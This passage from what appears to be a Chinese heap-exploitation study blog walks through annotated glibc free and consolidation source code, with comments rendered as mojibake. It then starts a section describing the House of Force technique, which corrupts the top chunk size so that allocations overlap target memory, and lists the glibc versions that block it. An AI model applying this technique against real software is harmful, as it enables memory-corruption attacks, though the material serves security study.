          if (p2 == MAP_FAILED)
            return 0;

          if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))
            {
              __munmap (p2, HEAP_MAX_SIZE);
              return 0;
            }
        }
    }

  /* è°ƒç”¨ mprotect()å‡½æ•°å°† size å¤§å°çš„å†…å­˜è®¾ç½®ä¸ºå¯è¯»å¯å†™ï¼Œå¦‚æœå¤±è´¥ï¼Œ*/
  /* è§£é™¤æ•´ä¸ª sub_heap çš„æ˜ å°„ã€‚ç„¶åæ›´æ–° heap_info å®ä¾‹ä¸­çš„ç›¸å…³å­—æ®µ */
  if (__mprotect (p2, size, PROT_READ | PROT_WRITE) != 0)
    {
      __munmap (p2, HEAP_MAX_SIZE);
      return 0;
    }
  h = (heap_info *) p2;
  h-&gt;size = size;
  h-&gt;mprotect_size = size;
  LIBC_PROBE (memory_heap_new, 2, h, h-&gt;size);
  return h;
}
</code></pre>
<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><pre><code class="c">/*
  free(void* p)
  Releases the chunk of memory pointed to by p, that had been previously
  allocated using malloc or a related routine such as realloc.
  It has no effect if p is null. It can have arbitrary (i.e., bad!)
  effects if p has already been freed.

  Unless disabled (using mallopt), freeing very large spaces will
  when possible, automatically trigger operations that give
  back unused memory to the system, thus reducing program footprint.
*/
void __libc_free(void *mem) {
    mstate ar_ptr;
    mchunkptr p;                          /* chunk corresponding to mem */

    // å¦‚æœå­˜åœ¨ __free_hook åˆ™æ‰§è¡Œå…¶å†…å®¹
    void (*hook)(void *, const void *)
    = atomic_forced_read(__free_hook);
    if (__builtin_expect(hook != NULL, 0)) {
        (*hook)(mem, RETURN_ADDRESS (0));
        return;
    }
    // free NULL
    if (mem == 0)                              /* free(0) has no effect */
        return;

    // æ‹¿åˆ°ç¨‹åºæŒ‡é’ˆ
    p = mem2chunk (mem);

    // å¦‚æœ chunk æ˜¯ mmap å‡½æ•°è¿”å›çš„ï¼Œåˆ™ä½¿ç”¨ munmap_chunk å‡½æ•°é‡Šæ”¾
    if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
        /* See if the dynamic brk/mmap threshold needs adjusting.
       Dumped fake mmapped chunks do not affect the threshold.  */
        // å¦‚æœå¼€å¯äº†mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶
        // å¦‚æœå½“å‰ free çš„ chunk çš„å¤§å°å¤§äºè®¾ç½®çš„ mmap åˆ†é…é˜ˆå€¼
        // ä¸”å°äº mmap åˆ†é…é˜ˆå€¼çš„æœ€å¤§å€¼
        if (!mp_.no_dyn_threshold
            &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold
            &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX
            &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) {
            // å°†å½“å‰ chunk çš„å¤§å°èµ‹å€¼ç»™ mmap åˆ†é…é˜ˆå€¼
            mp_.mmap_threshold = chunksize (p);
            // mmap æ”¶ç¼©é˜ˆå€¼ä¸º mmapåˆ†é…é˜ˆå€¼çš„ 2 å€
            mp_.trim_threshold = 2 * mp_.mmap_threshold;
            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2,
                       mp_.mmap_threshold, mp_.trim_threshold);
        }
        //ç„¶åè°ƒç”¨ munmap_chunké‡Šæ”¾å‡½æ•°
        munmap_chunk(p);
        return;
    }

    MAYBE_INIT_TCACHE ();
    // è·å¾—æŒ‡å‘ arena çš„æŒ‡é’ˆ
    ar_ptr = arena_for_chunk (p);
    // ä½¿ç”¨ _int_free é‡Šæ”¾ chunk
    _int_free(ar_ptr, p, 0);
}
</code></pre>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><pre><code class="c">static void
_int_free(mstate av, mchunkptr p, int have_lock) {
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr *fb;             /* associated fastbin */
    mchunkptr nextchunk;         /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize;    /* its size */
    int nextinuse;               /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    mchunkptr bck;               /* misc temp for linking */
    mchunkptr fwd;               /* misc temp for linking */

    // #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    // #define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))
    // #define chunksize_nomask(p)         ((p)-&gt;mchunk_size)
    // æ‹¿åˆ°å»é™¤æ ‡å¿—ä½çš„ size
    size = chunksize (p);

    /* Little security check which won&#39;t hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by &quot;design&quot; from some intruder.  */
    // å¦‚æœ chunk çš„æŒ‡é’ˆåœ°å€æº¢å‡º
    // æˆ– chunk å¹¶æ²¡æœ‰å¯¹é½
    if (__builtin_expect((uintptr_t) p &gt; (uintptr_t) - size, 0)
        || __builtin_expect(misaligned_chunk (p), 0))
        malloc_printerr(&quot;free(): invalid pointer&quot;);
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */

    // å¦‚æœ size å°äº MINSIZE
    // æˆ–è€… size æ²¡æœ‰å¯¹å…¶
    if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size)))
    malloc_printerr(&quot;free(): invalid size&quot;);

    // å•¥ä¹Ÿæ²¡å¹²
    check_inuse_chunk(av, p);

#if USE_TCACHE
    {
      // æ‹¿åˆ°å¯¹åº”çš„ tcache ç´¢å¼•
      size_t tc_idx = csize2tidx (size);

      // å¦‚æœå¼€å¯äº† tcache
      // ä¸” ç´¢å¼•æ²¡æœ‰è¶…è¿‡å‡ºèŒƒå›´
      // ä¸” å¯¹åº”çš„ tcache æœªæ»¡
      if (tcache
      &amp;&amp; tc_idx &lt; mp_.tcache_bins
      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
        {
          // å°†è¯¥ chunk æ”¾åœ¨å¯¹åº”çš„ tcache é‡Œ
          tcache_put (p, tc_idx);
          return;
        }
    }
#endif

    /*
      If eligible, place chunk on a fastbin so it can be found
      and used quickly in malloc.
    */
    // å¦‚æœ size åœ¨ fastbin çš„èŒƒå›´ä¹‹å†…
    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast())

    // å¦‚æœè®¾ç½®äº† TRIM_FASTBINSï¼Œä¸è¦å°†é è¿‘é¡¶éƒ¨çš„å—æ”¾å…¥ fastbins
    // ä½† TRIM_FASTBINS é»˜è®¤ä¸º 0ï¼Œå³ top_chunk ä¸ä¼šåˆå¹¶ä¸å®ƒç›¸é‚»çš„ fastbin å—
#if TRIM_FASTBINS
        /*
      If TRIM_FASTBINS set, don&#39;t place chunks
      bordering top into fastbins
        */
        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
#endif
            ) {
        // æ£€æŸ¥ä¸‹ä¸€ä¸ª chunk çš„å¤§å°ï¼Œä¸èƒ½å°äº 2 * SIZE_SZ ï¼Œä¹Ÿä¸èƒ½å¤§äº av-&gt;system_mem,
        if (__builtin_expect(chunksize_nomask (chunk_at_offset(p, size))
                             &lt;= 2 * SIZE_SZ, 0)
            || __builtin_expect(chunksize (chunk_at_offset(p, size))
                                &gt;= av-&gt;system_mem, 0)) {
            bool fail = true;
            /* We might not have a lock at this point and concurrent modifications
               of system_mem might result in a false positive.  Redo the test after
               getting the lock.  */
            if (!have_lock) {
                __libc_lock_lock(av-&gt;mutex);
                fail = (chunksize_nomask (chunk_at_offset(p, size)) &lt;= 2 * SIZE_SZ
                        || chunksize (chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);
                __libc_lock_unlock(av-&gt;mutex);
            }

            if (fail)
                malloc_printerr(&quot;free(): invalid next size (fast)&quot;);
        }
        // é‡Šæ”¾ä¹‹å‰å°† chunk å¡«ä¸º perturb_byte
        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);
        // è®¾ç«‹ have_fastchunks æ ‡å¿—ä½ï¼Œè¡¨æ˜ fastbin ä¸­æœ‰å€¼
        atomic_store_relaxed(&amp;av-&gt;have_fastchunks, true);
        // æ‹¿åˆ°å¯¹åº”çš„ fastbin ç´¢å¼•
        unsigned int idx = fastbin_index(size);
        // æ‹¿åˆ°ç¬¬ä¸€ä¸ªå…ƒç´ 
        fb = &amp;fastbin (av, idx);

        /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
        mchunkptr old = *fb, old2;

        if (SINGLE_THREAD_P) {
            /* Check that the top of the bin is not the record we are going to
               add (i.e., double free).  */
            // double free
            if (__builtin_expect(old == p, 0))
                malloc_printerr(&quot;double free or corruption (fasttop)&quot;);
            // å°†æ–°é‡Šæ”¾çš„ chunk æ’å…¥é“¾ä¸­
            p-&gt;fd = old;
            *fb = p;
        } else
            do {
                /* Check that the top of the bin is not the record we are going to
                   add (i.e., double free).  */
                if (__builtin_expect(old == p, 0))
                    malloc_printerr(&quot;double free or corruption (fasttop)&quot;);
                p-&gt;fd = old2 = old;
            } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))
                     != old2);

        /* Check that size of fastbin chunk at the top is the same as
           size of the chunk that we are adding.  We can dereference OLD
           only if we have the lock, otherwise it might have already been
           allocated again.  */
        // æ£€æŸ¥ è¯¥ chunk æ˜¯å¦æ”¾å¯¹äº†åœ°æ–¹
        if (have_lock &amp;&amp; old != NULL
            &amp;&amp; __builtin_expect(fastbin_index (chunksize(old)) != idx, 0))
            malloc_printerr(&quot;invalid fastbin entry (free)&quot;);
    }

        /*
          Consolidate other non-mmapped chunks as they arrive.
        */
    // size ä¸åœ¨ fastbin å†…
    // chunk ä¸æ˜¯ mmap åˆ†é…çš„
    else if (!chunk_is_mmapped(p)) {

        /* If we&#39;re single-threaded, don&#39;t lock the arena.  */
        if (SINGLE_THREAD_P)
            have_lock = true;

        if (!have_lock)
            __libc_lock_lock(av-&gt;mutex);

        // æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk
        nextchunk = chunk_at_offset(p, size);

        /* Lightweight tests: check whether the block is already the
           top block.  */
        // å¦‚æœé‡Šæ”¾çš„ chunk æ˜¯ top_chunk
        if (__glibc_unlikely(p == av-&gt;top))
            malloc_printerr(&quot;double free or corruption (top)&quot;);
        /* Or whether the next chunk is beyond the boundaries of the arena.  */
        // ä¸‹ä¸€ä¸ªå—è¶…å‡ºäº† arena çš„è¾¹ç•Œ
        if (__builtin_expect(contiguous (av)
                             &amp;&amp; (char *) nextchunk
                                &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))
            malloc_printerr(&quot;double free or corruption (out)&quot;);
        /* Or whether the block is actually not marked used.  */
        // ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse æ ‡å¿—ä½ä¸º 0ï¼Œå³å‰ä¸€ä¸ª chunk å·²ç»è¢«é‡Šæ”¾è¿‡äº†
        if (__glibc_unlikely(!prev_inuse(nextchunk)))
            malloc_printerr(&quot;double free or corruption (!prev)&quot;);

        // æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk çš„ size
        nextsize = chunksize(nextchunk);
        // å¦‚æœ ä¸‹ä¸€ä¸ª chunk çš„ size å°äº  2 * SIZE_SZ æˆ– å¤§äº av-&gt;system_mem
        if (__builtin_expect(chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0)
            || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0))
            malloc_printerr(&quot;free(): invalid next size (normal)&quot;);
        // å°†è¯¥ chunk çš„ data éƒ¨åˆ†å¡«å……ä¸º perturb_byte
        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);

        /* consolidate backward */
        // å¦‚æœé‡Šæ”¾å—ä¹‹å‰çš„å—ä¹Ÿæ˜¯ free çš„
        if (!prev_inuse(p)) {
            // æ‹¿åˆ°ä¸Šä¸€ä¸ª chunk çš„ size
            prevsize = prev_size (p);
            size += prevsize;
            // æ‹¿åˆ°å‰ä¸€ä¸ª chunk
            p = chunk_at_offset(p, -((long) prevsize));
            // å°†å‰ä¸€ä¸ª chunk å–æ¶ˆé“¾æ¥
            unlink(av, p, bck, fwd);
        }
        // å¦‚æœä¸‹ä¸€ä¸ª chunk ä¸ä¸º top_chunk
        if (nextchunk != av-&gt;top) {
            /* get and clear inuse bit */
            // æŸ¥çœ‹ä¸‹ä¸€ä¸ª chunk æ˜¯å¦ä¸º é‡Šæ”¾çŠ¶æ€
            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

            /* consolidate forward */
            // å¦‚æœä¸‹ä¸€ä¸ª chunk ä¹Ÿæ˜¯é‡Šæ”¾çŠ¶æ€
            if (!nextinuse) {
                // å°†ä¸‹ä¸€ä¸ª chunk å–æ¶ˆé“¾æ¥
                unlink(av, nextchunk, bck, fwd);
                size += nextsize;
            }
            // å¦‚æœä¸‹ä¸€ä¸ª chunk ä»å¤„äºä½¿ç”¨çŠ¶æ€
            else
                // æ¸…é™¤ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½
                clear_inuse_bit_at_offset(nextchunk, 0);

            /*
          Place the chunk in unsorted chunk list. Chunks are
          not placed into regular bins until after they have
          been given one chance to be used in malloc.
            */
            // æ‹¿åˆ° unsorter_bin
            bck = unsorted_chunks(av);
            // æ‹¿åˆ°é“¾ä¸Šçš„ç¬¬ä¸€ä¸ª chunk
            fwd = bck-&gt;fd;
            // æ£€æŸ¥åŒå‘é“¾æ¥å®Œæ•´æ€§
            if (__glibc_unlikely(fwd-&gt;bk != bck))
                malloc_printerr(&quot;free(): corrupted unsorted chunks&quot;);
            // å°†é‡Šæ”¾çš„ chunk åŠ å…¥é“¾ä¸­
            p-&gt;fd = fwd;
            p-&gt;bk = bck;
            // å¦‚æœ size åœ¨ lage_bin çš„èŒƒå›´ä¹‹ä¸­
            // æ¸…é™¤ nextsize åŸŸ
            if (!in_smallbin_range(size)) {
                p-&gt;fd_nextsize = NULL;
                p-&gt;bk_nextsize = NULL;
            }
            // å®Œæˆé“¾æ¥
            bck-&gt;fd = p;
            fwd-&gt;bk = p;
            // è®¾ç«‹ æ ‡å¿—ä½
            set_head(p, size | PREV_INUSE);
            set_foot(p, size);

            // å•¥ä¹Ÿæ²¡å¹²
            check_free_chunk(av, p);
        }

            /*
              If the chunk borders the current high end of memory,
              consolidate into top
            */
        // ä¸ top_chunk è¿›è¡Œåˆå¹¶
        else {
            size += nextsize;
            set_head(p, size | PREV_INUSE);
            av-&gt;top = p;
            check_chunk(av, p);
        }

        /*
          If freeing a large space, consolidate possibly-surrounding
          chunks. Then, if the total unused topmost memory exceeds trim
          threshold, ask malloc_trim to reduce top.

          Unless max_fast is 0, we don&#39;t know if there are fastbins
          bordering top, so we cannot tell for sure whether threshold
          has been reached unless fastbins are consolidated.  But we
          don&#39;t want to consolidate on each free.  As a compromise,
          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
          is reached.
        */
        // å¦‚æœ size å¤§äº FASTBIN_CONSOLIDATION_THRESHOLD
        if ((unsigned long) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {
            // å¦‚æœ fastbin ä¸­æœ‰ç©ºé—²çš„ chunk
            if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))
                // è§¦å‘ malloc_consolidate
                malloc_consolidate(av);
            // å¦‚æœæ­¤æ—¶çš„ arena ä¸º main_arena
            if (av == &amp;main_arena) {
#ifndef MORECORE_CANNOT_TRIM
                // å¦‚æœ top_chunk çš„ size å¤§äº heapçš„æ”¶ç¼©é˜ˆå€¼
                if ((unsigned long) (chunksize(av-&gt;top)) &gt;=
                    (unsigned long) (mp_.trim_threshold))
                    systrim(mp_.top_pad, av);
#endif
            } else {
                /* Always try heap_trim(), even if the top chunk is not
                   large, because the corresponding heap might go away.  */
                // æ”¶ç¼©éä¸»åˆ†é…åŒº
                heap_info *heap = heap_for_ptr(top(av));

                assert(heap-&gt;ar_ptr == av);
                heap_trim(heap, mp_.top_pad);
            }
        }

        if (!have_lock)
            __libc_lock_unlock(av-&gt;mutex);
    }
        /*
          If the chunk was allocated via mmap, release via munmap().
        */
    // è¯¥ chunk æ˜¯ mmap åˆ†é…çš„
    else {
        munmap_chunk(p);
    }
}
</code></pre>
<h4 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h4><pre><code class="c">/*
   systrim is an inverse of sorts to sysmalloc.  It gives memory back
   to the system (via negative arguments to sbrk) if there is unused
   memory at the `high&#39; end of the malloc pool. It is called
   automatically by free() when top space exceeds the trim
   threshold. It is also called by the public malloc_trim routine.  It
   returns 1 if it actually released any memory, else 0.
 */

static int systrim(size_t pad, mstate av) {
    long top_size;         /* Amount of top-most memory */
    long extra;            /* Amount to release */
    long released;         /* Amount actually released */
    char *current_brk;     /* address returned by pre-check sbrk call */
    char *new_brk;         /* address returned by post-check sbrk call */
    size_t pagesize;
    long top_area;

    pagesize = GLRO(dl_pagesize);
    top_size = chunksize (av-&gt;top);

    top_area = top_size - MINSIZE -1;
    if (top_area &lt;= pad)
        return 0;

    /* Release in pagesize units and round down to the nearest page.  */
    extra = ALIGN_DOWN(top_area - pad, pagesize);

    if (extra == 0)
        return 0;

    /*
       Only proceed if end of memory is where we last set it.
       This avoids problems if there were foreign sbrk calls.
     */
    current_brk = (char *) (MORECORE(0));
    if (current_brk == (char *) (av-&gt;top) + top_size) {
        /*
           Attempt to release memory. We ignore MORECORE return value,
           and instead call again to find out where new end of memory is.
           This avoids problems if first call releases less than we asked,
           of if failure somehow altered brk value. (We could still
           encounter problems if it altered brk in some very bad way,
           but the only thing we can do is adjust anyway, which will cause
           some downstream failure.)
         */

        MORECORE(-extra);
        /* Call the `morecore&#39; hook if necessary.  */
        void (*hook)(void) = atomic_forced_read(__after_morecore_hook);
        if (__builtin_expect(hook != NULL, 0))
            (*hook)();
        new_brk = (char *) (MORECORE(0));

        LIBC_PROBE(memory_sbrk_less, 2, new_brk, extra);

        if (new_brk != (char *) MORECORE_FAILURE) {
            released = (long) (current_brk - new_brk);

            if (released != 0) {
                /* Success. Adjust top. */
                av-&gt;system_mem -= released;
                set_head (av-&gt;top, (top_size - released) | PREV_INUSE);
                check_malloc_state (av);
                return 1;
            }
        }
    }
    return 0;
}
</code></pre>
<h4 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h4><pre><code class="c">static void munmap_chunk(mchunkptr p) {
    INTERNAL_SIZE_T size = chunksize (p);

    assert(chunk_is_mmapped (p));

    /* Do nothing if the chunk is a faked mmapped chunk in the dumped
       main arena.  We never free this memory.  */
    if (DUMPED_MAIN_ARENA_CHUNK (p))
        return;

    uintptr_t block = (uintptr_t) p - prev_size (p);
    size_t total_size = prev_size (p) + size;
    /* Unfortunately we have to do the compilers job by hand here.  Normally
       we would test BLOCK and TOTAL-SIZE separately for compliance with the
       page size.  But gcc does not recognize the optimization possibility
       (in the moment at least) so we combine the two values into one before
       the bit test.  */
    if (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - 1)) != 0, 0))
        malloc_printerr(&quot;munmap_chunk(): invalid pointer&quot;);

    atomic_decrement(&amp;mp_.n_mmaps);
    atomic_add(&amp;mp_.mmapped_mem, -total_size);

    /* If munmap failed the process virtual memory address space is in a
       bad shape.  Just leave the block hanging around, the process will
       terminate shortly anyway since not much can be done.  */
    __munmap((char *) block, total_size);
}
</code></pre>
<h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><pre><code class="c">/*
  ------------------------- malloc_consolidate -------------------------

  malloc_consolidate is a specialized version of free() that tears
  down chunks held in fastbins.  Free itself cannot be used for this
  purpose since, among other things, it might place chunks back onto
  fastbins.  So, instead, we need to use a minor variant of the same
  code.
*/
static void malloc_consolidate(mstate av) {
    mfastbinptr *fb;                 /* current fastbin being consolidated */
    mfastbinptr *maxfb;              /* last fastbin (for loop control) */
    mchunkptr p;                  /* current chunk being consolidated */
    mchunkptr nextp;              /* next chunk to consolidate */
    mchunkptr unsorted_bin;       /* bin header */
    mchunkptr first_unsorted;     /* chunk to link to */

    /* These have same use as in free() */
    mchunkptr nextchunk;
    INTERNAL_SIZE_T size;
    INTERNAL_SIZE_T nextsize;
    INTERNAL_SIZE_T prevsize;
    int nextinuse;
    mchunkptr bck;
    mchunkptr fwd;

    // æ¸…é™¤ have_fastchunks æ ‡å¿—ä½
    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, false);
    // æ‹¿åˆ° unsorted_bin
    unsorted_bin = unsorted_chunks(av);

    /*
      Remove each chunk from fast bin and consolidate it, placing it
      then in unsorted bin. Among other reasons for doing this,
      placing in unsorted bin avoids needing to calculate actual bins
      until malloc is sure that chunks aren&#39;t immediately going to be
      reused anyway.
    */
    // æ‹¿åˆ°æœ€å¤§çš„ fastbin entry åœ°å€
    maxfb = &amp;fastbin (av, NFASTBINS - 1);
    // æ‹¿åˆ°æœ€å°çš„ fastbin entry åœ°å€
    fb = &amp;fastbin (av, 0);
    do {
        // æ›¿æ¢ p çš„å€¼ä¸º fb
        p = atomic_exchange_acq(fb, NULL);
        // å¦‚æœ p ä¸ä¸º null
        if (p != 0) {
            do {
                {
                    // æ ¹æ® size æ‹¿åˆ°å¯¹åº”çš„ fastbin ç´¢å¼•
                    unsigned int idx = fastbin_index (chunksize(p));
                    // å¦‚æœä¸åŒ¹é…
                    if ((&amp;fastbin (av, idx)) != fb)
                        malloc_printerr(&quot;malloc_consolidate(): invalid chunk size&quot;);
                }
                // å•¥ä¹Ÿæ²¡å¹²
                check_inuse_chunk(av, p);
                // æ‹¿åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ 
                nextp = p-&gt;fd;

                /* Slightly streamlined version of consolidation code in free() */
                // æ‹¿åˆ°size
                size = chunksize (p);
                // æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk ï¼ˆç‰©ç†æ„ä¹‰ï¼‰
                nextchunk = chunk_at_offset(p, size);
                // æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk ï¼ˆç‰©ç†æ„ä¹‰ï¼‰çš„ size
                nextsize = chunksize(nextchunk);
                // å¦‚æœå‰ä¸€ä¸ª chunk ä¸ºé‡Šæ”¾çŠ¶æ€
                if (!prev_inuse(p)) {
                    prevsize = prev_size (p);
                    size += prevsize;
                    p = chunk_at_offset(p, -((long) prevsize));
                    unlink(av, p, bck, fwd);
                }
                // å¦‚æœä¸‹ä¸€ä¸ª ä¸æ˜¯ top_chunk
                if (nextchunk != av-&gt;top) {
                    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

                    if (!nextinuse) {
                        size += nextsize;
                        unlink(av, nextchunk, bck, fwd);
                    } else
                        clear_inuse_bit_at_offset(nextchunk, 0);
                    // æ‹¿åˆ° unsorted_bin çš„ç¬¬ä¸€ä¸ªå…ƒç´ 
                    first_unsorted = unsorted_bin-&gt;fd;
                    // è¿›è¡Œé“¾æ¥
                    unsorted_bin-&gt;fd = p;
                    first_unsorted-&gt;bk = p;

                    if (!in_smallbin_range (size)) {
                        p-&gt;fd_nextsize = NULL;
                        p-&gt;bk_nextsize = NULL;
                    }

                    set_head(p, size | PREV_INUSE);
                    p-&gt;bk = unsorted_bin;
                    p-&gt;fd = first_unsorted;
                    set_foot(p, size);
                }
                // ä¸‹ä¸€ä¸ª chunk æ˜¯ top_chunk
                else {
                    size += nextsize;
                    set_head(p, size | PREV_INUSE);
                    av-&gt;top = p;
                }

            } while ((p = nextp) != 0);

        }
    // éå†
    } while (fb++ != maxfb);
}
</code></pre>
<h3 id="Flowchart"><a href="#Flowchart" class="headerlink" title="Flowchart"></a>Flowchart</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p><img src="Heap.assets/image-20221018211322536.png" alt="image-20221018211322536"></p>
<h4 id="sysmalloc-1"><a href="#sysmalloc-1" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><p><img src="Heap.assets/image-20221018211539984.png" alt="image-20221018211539984"></p>
<h4 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h4><p><img src="Heap.assets/image-20221018211632490.png" alt="image-20221018211632490"></p>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p><img src="Heap.assets/image-20221018211608180.png" alt="image-20221018211608180"></p>
<h2 id="Basic-Vulnerable"><a href="#Basic-Vulnerable" class="headerlink" title="Basic Vulnerable"></a>Basic Vulnerable</h2><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><h4 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>ç”¨ä¸€ä¸ªè¾ƒå¤§çš„å€¼æ¥é‡å†™top_chunkçš„å¤§å°å­—æ®µï¼Œç„¶åè¯·æ±‚è¶³å¤Ÿçš„å†…å­˜æ¥å¼¥è¡¥é¡¶å—å’Œç›®æ ‡æ•°æ®ä¹‹é—´çš„å·®è· ã€‚ä»¥è¿™ç§æ–¹å¼è¿›è¡Œçš„åˆ†é…å¯ä»¥ç¯ç»•VAç©ºé—´ï¼Œä½¿å¾—è¿™ç§æŠ€æœ¯å¯ä»¥ä»¥æ¯”å †æ›´ä½çš„åœ°å€ä¸ºç›®æ ‡åœ°å€ã€‚</p>
<h4 id="è¯¦æƒ…"><a href="#è¯¦æƒ…" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p>åœ¨GLIBCç‰ˆæœ¬&lt;2.29ä¸­ï¼Œtop chunk å¤§å°å­—æ®µåœ¨åˆ†é…æœŸé—´ä¸å—ä»»ä½•å®Œæ•´æ€§æ£€æŸ¥ã€‚å¦‚æœä¸€ä¸ªtop chunkå¤§å° çš„å­—æ®µè¢«è¦†ç›–ï¼Œä¾‹å¦‚æº¢å‡ºå¹¶è¢«æ›¿æ¢æˆä¸€ä¸ªå¤§çš„å€¼ï¼Œé‚£ä¹ˆä»è¯¥top chunkçš„åç»­åˆ†é…å¯èƒ½ä¼šä¸ä½¿ç”¨ä¸­çš„å†…å­˜é‡å ã€‚åœ¨GLIBC&lt;2.30çš„ç‰ˆæœ¬ä¸­ï¼Œä»ä¸€ä¸ªè¢«ç ´åçš„top chunkä¸­åˆ†é…çš„éå¸¸å¤§çš„å†…å­˜å¯ä»¥ç¯ç»•VAç©ºé—´ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªtop chunk ä»åœ°å€0x405000å¼€å§‹ï¼Œé©»ç•™åœ¨ç¨‹åºæ•°æ®éƒ¨åˆ†çš„åœ°å€0x404000çš„ç›®æ ‡æ•°æ®å¿…é¡»è¢«è¦†ç›–ã€‚ä½¿ç”¨æº¢å‡ºè¦†ç›–é¡¶top chunk å¤§å°å­—æ®µï¼Œå°†å…¶æ›¿æ¢ä¸º0xffffffffffffff1çš„å€¼ã€‚æ¥ä¸‹æ¥ï¼Œè®¡ç®—å°†top chunk ç§»åŠ¨åˆ°ç›®æ ‡ä¹‹å‰çš„åœ°å€æ‰€éœ€çš„å­—èŠ‚æ•°ã€‚æ€»æ•°æ˜¯0xffffffffffffffffff-0x405000å­—èŠ‚ï¼Œä»¥è¾¾åˆ°VAç©ºé—´çš„æœ«ç«¯ï¼Œç„¶åæ˜¯0x404000-0x20ä¸ªå­—èŠ‚ï¼Œä»¥åœ¨ç›®æ ‡åœ°å€ä¹‹å‰åœæ­¢ã€‚<br>åœ¨è¿™ä¸ªè¯·æ±‚top chunkå¾—åˆ°æœåŠ¡åï¼Œä¸‹ä¸€ä¸ªç”³è¯·çš„å—å°†ä¸ç›®æ ‡æ•°æ®é‡å ã€‚</p>
<h4 id="é™åˆ¶æ¡ä»¶"><a href="#é™åˆ¶æ¡ä»¶" class="headerlink" title="é™åˆ¶æ¡ä»¶"></a>é™åˆ¶æ¡ä»¶</h4><ul>
<li><p>GLIBC 2.29ç‰ˆå¼•å…¥äº†é¡¶éƒ¨å—å¤§å°å­—æ®µçš„åˆç†æ€§æ£€æŸ¥ã€‚<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45">link</a></p>
<p><img src="Heap.assets/image-20220814132821567.png" alt="image-20220814132821567"></p>
</li>
<li><p>GLIBC 2.30ç‰ˆå¼•å…¥äº†æœ€å¤§åˆ†é…å¤§å°æ£€æŸ¥ï¼Œå®ƒé™åˆ¶äº† house of forceâ€å¯ä»¥å¼¥è¡¥çš„å·®è·å¤§å°ã€‚<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=0e3d4dd5163f5fa8fb07b71fb7e318e7b10f5cfd;hp=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hb=9bf8e29ca136094f73f69f725f15c51facc97206;hpb=52faba65f84ee5a8d82ff813bcfa0ee5f4d480cf">link</a></p>
<p><img src="Heap.assets/image-20220814133216729.png" alt="image-20220814133216729"></p>
</li>
</ul>
<h4 id="ç¤ºä¾‹ä¸€ï¼šhouse-of-force"><a href="#ç¤ºä¾‹ä¸€ï¼šhouse-of-force" class="headerlink" title="ç¤ºä¾‹ä¸€ï¼šhouse_of_force"></a>ç¤ºä¾‹ä¸€ï¼šhouse_of_force</h4><blockquote>
